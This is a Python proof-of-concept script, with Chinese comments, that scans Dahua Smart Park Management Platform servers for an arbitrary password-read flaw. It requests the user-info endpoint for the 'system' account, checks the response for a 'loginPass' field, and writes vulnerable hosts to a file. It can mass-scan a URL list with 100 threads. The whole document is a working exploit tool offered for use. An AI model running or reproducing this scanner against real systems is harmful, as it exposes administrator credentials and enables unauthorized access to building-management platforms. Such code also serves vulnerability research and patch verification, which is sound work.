# 大华智慧园区管理平台任意密码读取
import argparse, requests, sys  # 导入所需模块
from multiprocessing.dummy import Pool  # 导入线程池用于多线程处理
requests.packages.urllib3.disable_warnings()  # 禁用HTTPS请求的警告

def banner():
    # 定义并打印横幅，包含作者信息、日期和版本
    banner = '''  
██████╗ ██╗  ██╗███████╗██╗  ██╗██╗   ██╗ ██████╗         ██████╗  █████╗ ███████╗███████╗██╗    ██╗██████╗   
██╔══██╗██║  ██║╚══███╔╝██║  ██║╚██╗ ██╔╝██╔═══██╗        ██╔══██╗██╔══██╗██╔════╝██╔════╝██║    ██║██╔══██╗  
██║  ██║███████║  ███╔╝ ███████║ ╚████╔╝ ██║   ██║        ██████╔╝███████║███████╗███████║██║ █╗ ██║██║  ██║  
██║  ██║██╔══██║ ███╔╝  ██╔══██║  ╚██╔╝  ██║▄▄ ██║        ██╔═══╝ ██╔══██║╚════██║╚════██║██║███╗██║██║  ██║  
██████╔╝██║  ██║███████╗██║  ██║   ██║   ╚██████╔╝███████╗██║     ██║  ██║███████║███████║╚███╔███╔╝██████╔╝  
╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝ ╚══╝╚══╝ ╚═════╝   
                                   author:MOYV  
                                   date:2024/09/03  
                                   version:1.0   
'''
    print(banner)  # 打印横幅信息

def poc(target):
    # 测试目标URL是否存在任意密码读取漏洞
    url = target + "/admin/user_getUserInfoByUserName.action?userName=system"  # 生成请求URL
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
    }

    try:
        res1 = requests.get(url=target, verify=False)  # 发送GET请求到目标URL，忽略SSL证书验证
        if res1.status_code == 200:  # 检查目标URL是否返回200，即请求成功
            res2 = requests.get(url=url, headers=headers, verify=False, timeout=5)  # 发送请求查看是否存在密码读取
            if "loginPass" in res2.text:  # 检查响应中是否包含"loginPass"字段
                print(f"[+]{target}存在任意密码读取")  # 输出结果，表示存在漏洞
                # 将结果写入文件
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}存在任意密码读取\n")
            else:
                print(f"[-]{target}不存在任意密码读取")  # 输出结果，表示不存在漏洞
    except:
        print(f"[!]{target}可能存在问题，请手动检测")  # 捕获异常，提示可能的问题

def main():
    banner()  # 调用打印横幅函数
    # 创建一个解析器，处理命令行参数
    parse = argparse.ArgumentParser(description="大华智慧园区管理平台任意密码读取漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")  # 添加URL参数
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")  # 添加文件参数
    args = parse.parse_args()  # 解析命令行参数

    # 如果指定了URL，且没有指定文件
    if args.url and not args.file:
        poc(args.url)  # 调用poc函数检测指定的URL
    # 如果没有指定URL，且指定了文件
    elif not args.url and args.file:
        url_list = []  # 列表用于存储读取的URL
        with open(args.file, "r", encoding='utf-8') as f:  # 读取文件中的URL
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))  # 去除换行符并添加到列表
        mp = Pool(100)  # 创建一个包含100个线程的线程池
        mp.map(poc, url_list)  # 将任务分发到线程池中
        mp.close()  # 关闭线程池，不再接受新任务
        mp.join()  # 等待所有线程完成
    else:
        # 如果提供的参数不符合要求，则输出用法
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()  # 调用主函数